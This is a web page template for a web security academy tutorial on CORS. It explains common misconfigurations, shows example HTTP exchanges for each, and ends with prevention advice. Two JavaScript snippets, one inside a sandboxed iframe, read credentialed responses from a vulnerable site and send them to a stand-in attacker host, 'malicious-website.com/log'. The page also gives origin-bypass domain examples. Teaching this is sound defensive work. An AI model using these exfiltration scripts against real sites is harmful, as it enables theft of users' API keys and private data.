@extends('layouts.academy')

@section('title', 'What is CORS (cross-origin resource sharing)? Tutorial & Examples | Web Security Academy | '.config('app.name'))
@section('legacy_css', '/content/pswebsecacademy.css')

@section('academy_body')
@verbatim
<div class="wrapper-large">
    <div class="container-academy">

        <input class="nav-lhs-toggle-input" type="checkbox" id="nav-lhs-toggle">
        <aside class="nav-lhs" id="tree-nav" tree-nav-version="15">
            <nav class="nav-lhs-scrollable">
                <label class="nav-lhs-toggle-label" for="nav-lhs-toggle"></label>
                

        <a class="nav-back" href="/web-security/all-topics">
            <span class="icon-arrow-head-left"></span>
            Back to all topics
        </a>
        <input type="checkbox" id="nav-main-id">
        <label class="nav-label" for="nav-main-id">
            <span class="icon-arrow-head-down"></span>
        </label>
        <h3>Cross-origin resource sharing (CORS)</h3>
        <ul>
            <li><a href="/web-security/cors#what-is-cors-cross-origin-resource-sharing">What is CORS?</a></li>
            <li>
                <input type="checkbox" id="sub-nav-id-1">
                <label for="sub-nav-id-1">
                    <a href="/web-security/cors/same-origin-policy">Same-origin policy (SOP)</a>
                    <span class="icon-arrow-head-down"></span>
                </label>
                <ul>
                    <li><a href="/web-security/cors/same-origin-policy#why-is-the-same-origin-policy-necessary">Why is SOP necessary?</a></li>
                    <li><a href="/web-security/cors/same-origin-policy#how-is-the-same-origin-policy-implemented">Implementation</a></li>
                    <li><a href="/web-security/cors#relaxation-of-the-same-origin-policy">Relaxation of the SOP</a></li>
                </ul>
            </li>
            <li>
                <input type="checkbox" id="sub-nav-id-2">
                <label for="sub-nav-id-2">
                    <a href="/web-security/cors/access-control-allow-origin">Access-Control-Allow-Origin (ACAO) response header</a>
                    <span class="icon-arrow-head-down"></span>
                </label>
                <ul>
                    <li><a href="/web-security/cors/access-control-allow-origin#implementing-simple-cross-origin-resource-sharing">Implementing simple CORS</a></li>
                    <li><a href="/web-security/cors/access-control-allow-origin#handling-cross-origin-resource-requests-with-credentials">Handling cross-origin resource requests with credentials</a></li>
                    <li><a href="/web-security/cors/access-control-allow-origin#relaxation-of-cors-specifications-with-wildcards">Relaxation of CORS specifications with wildcards</a></li>
                    <li><a href="/web-security/cors/access-control-allow-origin#pre-flight-checks">Pre-flight checks</a></li>
                    <li><a href="/web-security/cors/access-control-allow-origin#does-cors-protect-against-csrf">Does CORS protect against CSRF?</a></li>
                </ul>
            </li>
            <li>
                <input type="checkbox" id="sub-nav-id-3">
                <label for="sub-nav-id-3">
                    <a href="/web-security/cors#vulnerabilities-arising-from-cors-configuration-issues">Vulnerabilities</a>
                    <span class="icon-arrow-head-down"></span>
                </label>
                <ul>
                    <li><a href="/web-security/cors#server-generated-acao-header-from-client-specified-origin-header">Server-generated ACAO header from client-specified Origin header</a></li>
                    <li><a href="/web-security/cors#errors-parsing-origin-headers">Errors parsing Origin headers</a></li>
                    <li><a href="/web-security/cors#whitelisted-null-origin-value">Whitelisted null Origin value</a></li>
                    <li><a href="/web-security/cors#exploiting-xss-via-cors-trust-relationships">Exploiting XSS via CORS trust relationships</a></li>
                    <li><a href="/web-security/cors#breaking-tls-with-poorly-configured-cors">Breaking TLS with poorly configured CORS</a></li>
                    <li><a href="/web-security/cors#intranets-and-cors-without-credentials">Intranets and CORS without credentials</a></li>
                </ul>
            </li>
            <li><a href="/web-security/cors#how-to-prevent-cors-based-attacks">Preventing attacks</a></li>
            <li><a href="/web-security/ssrf/url-validation-bypass-cheat-sheet">URL validation bypass cheat sheet</a></li>
            <li><a href="/web-security/all-labs#cross-origin-resource-sharing-cors">View all CORS labs</a></li>
        </ul>
    
            </nav>
        </aside>
        <main>
            



<ul class="breadcrumb-list" itemscope itemtype="http://schema.org/BreadcrumbList"><li itemprop="itemListElement" itemscope itemtype="http://schema.org/ListItem"><a itemprop="item" href="/web-security"><span itemprop="name">Web Security Academy</span></a><meta itemprop="position" content="1" /></li><li itemprop="itemListElement" itemscope itemtype="http://schema.org/ListItem"><a itemprop="item" href="/web-security/cors"><span itemprop="name">CORS</span></a><meta itemprop="position" content="2" /></li></ul>    <div class="section theme-white">

        <h1 class="heading-2">Cross-origin resource sharing (CORS)</h1><p>
	In this section, we will explain what cross-origin resource sharing (CORS) is, describe some common examples of cross-origin resource sharing based attacks, and discuss how to protect against these attacks. This topic was written
	in collaboration with SecDevLab Research, who popularized this attack class with the presentation <a href="/research/exploiting-cors-misconfigurations-for-bitcoins-and-bounties">Exploiting CORS misconfigurations for Bitcoins and bounties</a>.
</p><h2 id="what-is-cors-cross-origin-resource-sharing" chunk-id="CD8FE92162E7FC3AE21070CF67D81862">What is CORS (cross-origin resource sharing)?</h2><p>
	Cross-origin resource sharing (CORS) is a browser mechanism which enables controlled access to resources located outside of a given domain. It extends and adds flexibility to the same-origin policy (SOP). However, it also provides potential for cross-domain attacks, if a website's CORS policy is poorly configured and implemented. CORS is not a protection against cross-origin attacks such as cross-site request forgery (CSRF).
</p><img alt="CORS" src="/web-security/images/attack-on-cors.svg"><div class="highlightedarea">
	<h4>Labs</h4>
	<p>
		If you're already familiar with the basic concepts behind CORS vulnerabilities and just want to practice exploiting them on some realistic, deliberately vulnerable targets, you can access all of the labs in this topic from the link below.
	</p>

	<ul><li><a href="/web-security/all-labs#cross-origin-resource-sharing-cors">View all CORS labs</a></li></ul></div><h2 id="same-origin-policy" chunk-id="A3323F6BAE74D1EC89E469F94DF3E4A2">Same-origin policy</h2><p>
	The same-origin policy is a restrictive cross-origin specification that limits the ability for a website to interact with resources outside of the source domain. The same-origin policy was defined many years ago in response to potentially malicious cross-domain interactions, such as one website stealing private data from another. It generally allows a domain to issue requests to other domains, but not to access the responses.
</p><div class="highlightedarea">
	<h4>Read more</h4>
	<ul><li><a href="/web-security/cors/same-origin-policy">Same-origin policy</a></li></ul>
</div><h2 id="relaxation-of-the-same-origin-policy" chunk-id="32A740AEB58A5906FF148D7A17140B6E">Relaxation of the same-origin policy</h2><p>
	The same-origin policy is very restrictive and consequently various approaches have been devised to circumvent the constraints. Many websites interact with subdomains or third-party sites in a way that requires full cross-origin access. A controlled relaxation of the same-origin policy is possible using cross-origin resource sharing (CORS).
</p><p>
	The cross-origin resource sharing protocol uses a suite of HTTP headers that define trusted web origins and associated properties such as whether authenticated access is permitted. These are combined in a header exchange between a browser and the cross-origin web site that it is trying to access.
</p><div class="highlightedarea">
	<h4>Read more</h4>
	<ul><li><a href="/web-security/cors/access-control-allow-origin">CORS and the Access-Control-Allow-Origin response header</a></li></ul>
</div><h2 id="vulnerabilities-arising-from-cors-configuration-issues" chunk-id="76C612EDD62CF364DB10A24A99FD99DB">Vulnerabilities arising from CORS configuration issues</h2><p>
	Many modern websites use CORS to allow access from subdomains and trusted third parties. Their implementation of CORS may contain mistakes or be overly lenient to ensure that everything works, and this can result in exploitable vulnerabilities.
</p><h3 id="server-generated-acao-header-from-client-specified-origin-header" chunk-id="18035EA42F127E96E6EEE737E4E02236" cms-ignore-validation="HEADING_CAPITALIZATION">Server-generated ACAO header from client-specified Origin header</h3><p>
	Some applications need to provide access to a number of other domains. Maintaining a list of allowed domains requires ongoing effort, and any mistakes risk breaking functionality. So some applications take the easy route of effectively allowing access from any other domain.
</p><p>
	One way to do this is by reading the Origin header from requests and including a response header stating that the requesting origin is allowed. For example, consider an application that receives the following request:
</p><code class="code-scrollable">GET /sensitive-victim-data HTTP/1.1
Host: vulnerable-website.com
Origin: https://malicious-website.com
Cookie: sessionid=...</code><p>
	It then responds with:
</p><code class="code-scrollable">HTTP/1.1 200 OK
Access-Control-Allow-Origin: https://malicious-website.com
Access-Control-Allow-Credentials: true
...</code><p>
	These headers state that access is allowed from the requesting domain (<code>malicious-website.com</code>) and that the cross-origin requests can include cookies (<code>Access-Control-Allow-Credentials: true</code>) and so will be processed in-session.
</p><p>
	Because the application reflects arbitrary origins in the <code>Access-Control-Allow-Origin</code> header, this means that absolutely any domain can access resources from the vulnerable domain. If the response contains any sensitive information such as an API key or CSRF token, you could retrieve this by placing the following script on your website:
</p><code class="code-scrollable">var req = new XMLHttpRequest();
req.onload = reqListener;
req.open('get','https://vulnerable-website.com/sensitive-victim-data',true);
req.withCredentials = true;
req.send();

function reqListener() {
	location='//malicious-website.com/log?key='+this.responseText;
};</code>@endverbatim@include('partials.widget', ['id' => 'academy-labstatus', 'labId' => '3C3123251C8FAEA3353DAFDF70678F6D9241BBCDDA2F8772CE17FB4DEE20CA0D'])@verbatim<h3 id="errors-parsing-origin-headers" chunk-id="BE926A05EFE5B94856564CA8FF36C5FB" cms-ignore-validation="HEADING_CAPITALIZATION">Errors parsing Origin headers</h3><p>
	Some applications that support access from multiple origins do so by using a whitelist of allowed origins. When a CORS request is received, the supplied origin is compared to the whitelist. If the origin appears on the whitelist then it is reflected in the <code>Access-Control-Allow-Origin</code> header so that access is granted. For example, the application receives a normal request like:
</p><code class="code-scrollable">GET /data HTTP/1.1
Host: normal-website.com
...
Origin: https://innocent-website.com</code><p>
	The application checks the supplied origin against its list of allowed origins and, if it is on the list, reflects the origin as follows:
</p><code class="code-scrollable">HTTP/1.1 200 OK
...
Access-Control-Allow-Origin: https://innocent-website.com</code><p id="errors-parsing-origin-headers-6F4G" chunk-id="57F971593DADC2C0971344F0FEDFA27D">
	Mistakes often arise when implementing CORS origin whitelists. Some organizations decide to allow access from all their subdomains (including future subdomains not yet in existence). And some applications allow access from various other organizations' domains including their subdomains. These rules are often implemented by matching URL prefixes or suffixes, or using regular expressions. Any mistakes in the implementation can lead to access being granted to unintended external domains.
</p><p>
	For example, suppose an application grants access to all domains ending in:
</p><code class="code-scrollable">normal-website.com</code><p>
	An attacker might be able to gain access by registering the domain:
</p><code class="code-scrollable">hackersnormal-website.com</code><p>
	Alternatively, suppose an application grants access to all domains beginning with
</p><code class="code-scrollable">normal-website.com</code><p>
	An attacker might be able to gain access using the domain:
</p><code class="code-scrollable">normal-website.com.evil-user.net</code><h3 id="whitelisted-null-origin-value" chunk-id="D7C828D6E7B4C4538990557370446E89">Whitelisted null origin value</h3><p>
	The specification for the Origin header supports the value <code>null</code>. Browsers might send the value <code>null</code> in the Origin header in various unusual situations:
</p><ul>
	<li>
		Cross-origin redirects.
	</li>
	<li>
		Requests from serialized data.
	</li>
	<li>
		Request using the <code>file:</code> protocol.
	</li>
	<li>
		Sandboxed cross-origin requests.
	</li>
</ul><p id="whitelisted-null-origin-value-8J5N">
	Some applications might whitelist the <code>null</code> origin to support local development of the application. For example, suppose an application receives the following cross-origin request:
</p><code class="code-scrollable">GET /sensitive-victim-data
Host: vulnerable-website.com
Origin: null</code><p>
	And the server responds with:
</p><code class="code-scrollable">HTTP/1.1 200 OK
Access-Control-Allow-Origin: null
Access-Control-Allow-Credentials: true</code><p>
	In this situation, an attacker can use various tricks to generate a cross-origin request containing the value <code>null</code> in the Origin header. This will satisfy the whitelist, leading to cross-domain access. For example, this can be done using a sandboxed <code>iframe</code> cross-origin request of the form:
</p><code class="code-scrollable">&lt;iframe sandbox="allow-scripts allow-top-navigation allow-forms" src="data:text/html,&lt;script&gt;
var req = new XMLHttpRequest();
req.onload = reqListener;
req.open('get','vulnerable-website.com/sensitive-victim-data',true);
req.withCredentials = true;
req.send();

function reqListener() {
location='malicious-website.com/log?key='+this.responseText;
};
&lt;/script&gt;"&gt;&lt;/iframe&gt;</code>@endverbatim@include('partials.widget', ['id' => 'academy-labstatus', 'labId' => '9D294029D336D1A8CEFB9D84577FC92304467E91F4F9918E74B50BE2C561DB79'])@verbatim<h3 id="exploiting-xss-via-cors-trust-relationships" chunk-id="F92CA22A90CFAF25A0C814B84E2C3B1D">Exploiting XSS via CORS trust relationships</h3><p>
	Even "correctly" configured CORS establishes a trust relationship between two origins. If a website trusts an origin that is vulnerable to cross-site scripting (XSS), then an attacker could exploit the XSS to inject some JavaScript that uses CORS to retrieve sensitive information from the site that trusts the vulnerable application.
</p><p id="exploiting-xss-via-cors-trust-relationships-1P3B" chunk-id="E8A067A7D709F972F92E541014D0C543">
	Given the following request:
</p><code class="code-scrollable">GET /api/requestApiKey HTTP/1.1
Host: vulnerable-website.com
Origin: https://subdomain.vulnerable-website.com
Cookie: sessionid=...</code><p>
	If the server responds with:
</p><code class="code-scrollable">HTTP/1.1 200 OK
Access-Control-Allow-Origin: https://subdomain.vulnerable-website.com
Access-Control-Allow-Credentials: true</code><p>
	Then an attacker who finds an XSS vulnerability on <code>subdomain.vulnerable-website.com</code> could use that to retrieve the API key, using a URL like:
</p><code class="code-scrollable">https://subdomain.vulnerable-website.com/?xss=&lt;script&gt;cors-stuff-here&lt;/script&gt;</code><h3 id="breaking-tls-with-poorly-configured-cors" chunk-id="E40602F79C7659BC5F07CDF0753BD4B6">Breaking TLS with poorly configured CORS</h3><p>
	Suppose an application that rigorously employs HTTPS also whitelists a trusted subdomain that is using plain HTTP. For example, when the application receives the following request:
</p><code class="code-scrollable">GET /api/requestApiKey HTTP/1.1
Host: vulnerable-website.com
Origin: http://trusted-subdomain.vulnerable-website.com
Cookie: sessionid=...</code><p>
	The application responds with:
</p><code class="code-scrollable">HTTP/1.1 200 OK
Access-Control-Allow-Origin: http://trusted-subdomain.vulnerable-website.com
Access-Control-Allow-Credentials: true</code><p id="breaking-tls-with-poorly-configured-cors-4Y2k">
	In this situation, an attacker who is in a position to intercept a victim user's traffic can exploit the CORS configuration to compromise the victim's interaction with the application. This attack involves the following steps:
</p><ul>
	<li>
		The victim user makes any plain HTTP request.
	</li>
	<li>
		<p>
			The attacker injects a redirection to:
		</p>
		<code class="code-scrollable">http://trusted-subdomain.vulnerable-website.com</code>
	</li>
	<li>
		The victim's browser follows the redirect.
	</li>
	<li>
		<p>
			The attacker intercepts the plain HTTP request, and returns a spoofed response containing a CORS request to:
		</p>
		<code class="code-scrollable">https://vulnerable-website.com</code>
	</li>
	<li>
		<p>
			The victim's browser makes the CORS request, including the origin:
		</p>
		<code class="code-scrollable">http://trusted-subdomain.vulnerable-website.com</code>
	</li>
	<li>
		The application allows the request because this is a <span>whitelisted</span> origin. The requested sensitive data is returned in the response.
	</li>
	<li>
		The attacker's spoofed page can read the sensitive data and transmit it to any domain under the attacker's control.
	</li>
</ul><p>
	This attack is effective even if the vulnerable website is otherwise robust in its usage of HTTPS, with no HTTP endpoint and all cookies flagged as secure.
</p>@endverbatim@include('partials.widget', ['id' => 'academy-labstatus', 'labId' => 'C2F3D400E6FB00BEBE61E8DCA6A98B25A66613B18DA83B2279298634C46D7F8E'])@verbatim<div class="highlightedarea">
	<h4>Read more</h4>

	<ul><li><a href="/web-security/cross-site-scripting">Cross-site scripting</a></li></ul></div><h3 id="intranets-and-cors-without-credentials" chunk-id="868855AAEEB835E693EFB657850E2E93">Intranets and CORS without credentials</h3><p>
	Most CORS attacks rely on the presence of the response header:
</p><code class="code-scrollable">Access-Control-Allow-Credentials: true</code><p>
	Without that header, the victim user's browser will refuse to send their cookies, meaning the attacker will only gain access to unauthenticated content, which they could just as easily access by browsing directly to the target website.
</p><p>
	However, there is one common situation where an attacker can't access a website directly: when it's part of an organization's intranet, and located within private IP address space. Internal websites are often held to a lower security standard than external sites, enabling attackers to find vulnerabilities and gain further access. For example, a cross-origin request within a private network may be as follows:
</p><code class="code-scrollable">GET /reader?url=doc1.pdf
Host: intranet.normal-website.com
Origin: https://normal-website.com</code><p>
	And the server responds with:
</p><code class="code-scrollable">HTTP/1.1 200 OK
Access-Control-Allow-Origin: *</code><p id="intranets-and-cors-without-credentials-5U1H">
	The application server is trusting resource requests from any origin without credentials. If users within the private IP address space access the public internet then a CORS-based attack can be performed from the external site that uses the victim's browser as a proxy for accessing intranet resources.
</p><h2 id="how-to-prevent-cors-based-attacks" chunk-id="FE7A01149130D15AB6C7F5A73D402448">How to prevent CORS-based attacks</h2><p>
	CORS vulnerabilities arise primarily as misconfigurations. Prevention is therefore a configuration problem. The following sections describe some effective defenses against CORS attacks.
</p><h3 id="proper-configuration-of-cross-origin-requests" chunk-id="8E9CFD3DF22C5FDFEBB33E33BA32DF9F">Proper configuration of cross-origin requests
</h3><p>
	If a web resource contains sensitive information, the origin should be properly specified in the <code>Access-Control-Allow-Origin</code> header.
</p><h3 id="only-allow-trusted-sites" chunk-id="8D7D3B09597F681F1F304D4CF5B1ED57">Only allow trusted sites
</h3><p>
	It may seem obvious but origins specified in the <code>Access-Control-Allow-Origin</code> header should only be sites that are trusted. In particular, dynamically reflecting origins from cross-origin requests without validation is readily exploitable and should be avoided.
</p><h3 id="avoid-whitelisting-null" chunk-id="D8DFA9074BC082324BFB6A00EC444B26">Avoid whitelisting null</h3><p>
	Avoid using the header <code>Access-Control-Allow-Origin: null</code>. Cross-origin resource calls from internal documents and sandboxed requests can specify the <code>null</code> origin. CORS headers should be properly defined in respect of trusted origins for private and public servers.
</p><h3 id="avoid-wildcards-in-internal-networks" chunk-id="81B1B13173952D2A074C64AC3E60E333">Avoid wildcards in internal networks</h3><p>
	Avoid using wildcards in internal networks. Trusting network configuration alone to protect internal resources is not sufficient when internal browsers can access untrusted external domains.
</p><h3 id="cors-is-not-a-substitute-for-server-side-security-policies" chunk-id="A4A97FC7CCCF0DDFB5BF7D9CC4E18BEF">CORS is not a substitute for server-side security policies</h3><p>
	CORS defines browser behaviors and is never a replacement for server-side protection of sensitive data - an attacker can directly forge a request from any trusted origin. Therefore, web servers should continue to apply protections over sensitive data, such as authentication and session management, in addition to properly configured CORS.
</p><div class="highlightedarea">
	<h4>Read more</h4>

	<ul>
		<li><a href="/web-security/all-labs">Find CORS vulnerabilities using Burp Suite's web vulnerability scanner</a></li>
		<li><a href="/web-security/ssrf/url-validation-bypass-cheat-sheet">URL validation bypass cheat sheet</a></li>
	</ul>
</div>
        
        @endverbatim@include('partials.widget', ['id' => 'academy-registration-footer'])@verbatim
    
    </div>


    
    
    

            
        </main>
    </div>
</div>
@endverbatim
@endsection
